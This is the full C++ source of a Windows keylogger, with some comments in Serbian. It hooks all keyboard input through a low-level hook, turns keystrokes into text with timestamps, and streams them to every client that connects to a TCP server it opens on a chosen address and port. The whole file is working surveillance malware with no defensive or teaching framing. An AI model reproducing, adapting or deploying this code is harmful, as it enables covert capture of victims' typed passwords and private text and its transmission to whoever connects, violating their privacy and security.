#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable: 4996)
#include <thread>
#include <WinSock2.h>
#include <iostream>
#include <vector>
#include <Windows.h>
#include <ctime>
#include <sstream>
#include <iomanip>
#include <datetimeapi.h>
#include <mutex>
#include <atomic>
#include <string>

WORD getVersion(){
	const static WORD WSA_VERSION = 0x202;
	return WSA_VERSION;
}

std::vector<SOCKET>& get_socket_container(){
	static std::vector<SOCKET> vek;
	return vek;
}

static std::mutex mutex_var_add_socket;
void addSocket(const SOCKET& sock){
	std::lock_guard<std::mutex> guard(mutex_var_add_socket);
	get_socket_container().push_back(sock);
}

SOCKET& get_listen_sock() {
	static SOCKET listen_sock = NULL;
	return listen_sock;
}

size_t get_container_size() {
	std::lock_guard<std::mutex> guard(mutex_var_add_socket);
	return get_socket_container().size();
}

void run_server(BYTE b1, BYTE b2, BYTE b3, BYTE b4, USHORT port) {
	
	WSADATA wsa;
	WSAStartup(getVersion(), &wsa);
	SOCKET& listen_sock = get_listen_sock();

	listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (listen_sock == INVALID_SOCKET) {
		throw("Failed to create listen_sock!");
	}
	sockaddr_in address;
	address.sin_family = AF_INET;
	address.sin_port = htons(port);
	address.sin_addr.S_un.S_un_b = {b1, b2, b3, b4};

	int status = bind(listen_sock, (sockaddr*)&address, sizeof(address));
	std::cerr << "CONNECTION STATUS: " << status << '\n';

	listen(listen_sock, 1024);
	while (1) {
		sockaddr_in address_client;
		int addrlen = sizeof(sockaddr_in);
		SOCKET client_sock = accept(listen_sock, (sockaddr*)&address_client, &addrlen);

		std::cout << "A new connection: " << '\n';
		addSocket(client_sock);

		std::cout << get_container_size() << '\n';
		
		auto bytes = address_client.sin_addr.S_un.S_un_b;
		std::cerr << (int)bytes.s_b1 << '.' << (int)bytes.s_b2 << '.' << (int)bytes.s_b3 << '.' << (int)bytes.s_b4 << '\n';
		std::cerr << ntohs(address_client.sin_port) << '\n';
	}
}

HHOOK& get_keyboard_hook() {
	static HHOOK keyboardHook = NULL;
	return keyboardHook;
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
	{
		PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;

		auto lambda = [](auto key) {
			std::string message = "";
			message = key;
			time_t ttime = time(0);
			message += " ";
			message += ctime(&ttime);

			std::vector<SOCKET>& vek = get_socket_container();
			std::lock_guard<std::mutex> guard(mutex_var_add_socket);

			for (auto iter = vek.begin(); iter != vek.end(); iter++) {
				send(*iter, message.c_str(), (int)message.size(), 0);
			}
		};

		//detektujemo taster
		if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
		{
			switch (key->vkCode) {
				// Invisible keys
			case VK_CAPITAL:
				lambda("<CAPLOCK>"); break;
			case VK_LCONTROL:
				lambda("<LCTRL>"); break;
			case VK_RCONTROL:
				lambda("<RCTRL>");break;
			case VK_INSERT:
				lambda("<INSERT>"); break;
			case VK_END:
				lambda("<END>"); break;
			case VK_PRINT:
				lambda("<PRONT>"); break;
			case VK_DELETE:
				lambda("<DEL>"); break;
			case VK_LEFT:
				lambda("<LEFT>"); break;
			case VK_RIGHT:
				lambda("<RIGHT>"); break;
			case VK_UP:
				lambda("<UP>"); break;
			case VK_DOWN:
				lambda("<DOWN>"); break;
			case VK_LSHIFT:
				lambda("<SHIFT_LEFT>"); break;
			case VK_RSHIFT:
				lambda("<SHIFT_RIGHT>"); break;			
			case VK_NUMPAD0:
				lambda('0');	break;
			case VK_NUMPAD1:
				lambda('1');	break;
			case VK_NUMPAD2:
				lambda('2');	break;
			case VK_NUMPAD3:
				lambda('3');	break;
			case VK_NUMPAD4:
				lambda('4');	break;
			case VK_NUMPAD5:
				lambda('5');	break;
			case VK_NUMPAD6:
				lambda('6');	break;
			case VK_NUMPAD7:
				lambda('7');	break;
			case VK_NUMPAD8:
				lambda('8');	break;
			case VK_NUMPAD9:
				lambda('9');	break;
			case VK_OEM_COMMA:
				lambda(',');	break;
			case VK_SPACE:
				lambda(' ');    break;
			case VK_RETURN:
				lambda("<ENTER>");		break;
			case VK_MULTIPLY:
				lambda('*');	break;
			case VK_ADD:
				lambda('+');	break;
			case VK_DIVIDE:
				lambda('/');	break;
			case VK_DECIMAL:
				lambda(',');	break;
			case VK_SUBTRACT:
				lambda('-'); 	break;
			case VK_BACK:
				lambda("<BACKSPACE>");	break;
			case VK_OEM_8:
			case 191:
				if (GetKeyState(VK_SHIFT) & 0x8000)
					lambda('?');
				else
					lambda("'"); break;
				
			case 0x31:
				if (GetKeyState(VK_SHIFT) & 0x8000)
					lambda('!');
				else
					lambda('1');
			break;
		
				// vidljivi karakteri
			default:				
		
				lambda((char)key->vkCode);

			}
		}
		return CallNextHookEx(get_keyboard_hook(), nCode, wParam, lParam);
	}

static std::mutex mutex_var_send_data;

BOOL WINAPI monitor(DWORD type) {
	
	auto lambda = []() {
		std::lock_guard<std::mutex> guard(mutex_var_send_data);
		std::lock_guard<std::mutex> guard2(mutex_var_add_socket);
		std::vector<SOCKET>& vek = get_socket_container();

		for (auto iter = vek.begin(); iter != vek.end(); iter++) {
			shutdown(*iter, SD_SEND);
			closesocket(*iter);
		}
		vek.clear();
	};

	switch (type)
	{
	case CTRL_SHUTDOWN_EVENT:
		//Komp se gasi
		lambda();
		return TRUE;
	case CTRL_CLOSE_EVENT:
		// gasimo program
		lambda();
		return true;
	case CTRL_LOGOFF_EVENT:
		//Logging off
		lambda();
		return TRUE;
	case CTRL_C_EVENT:
		//ctrl + c
		lambda();
		return TRUE;
	}

	return FALSE;
}

int main(){
	
	std::cout << "ENTER IP ADDRESS AND PORT (FOR SERVER) SEPARATED VIA SPACE:" << '\n';
	USHORT b1, b2, b3, b4, port;
	std::cin >> b1 >> b2 >> b3 >> b4 >> port;

	std::thread obj2(run_server, (BYTE)b1, (BYTE)b2, (BYTE)b3, (BYTE)b4, port);
	obj2.detach();
	
	SetConsoleCtrlHandler(monitor, TRUE);

	get_keyboard_hook() = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);

	MSG msg{ 0 };
	//loop aplikacije
	while (GetMessage(&msg, NULL, 0, 0) != 0);
	UnhookWindowsHookEx(get_keyboard_hook());

    return 0;
}

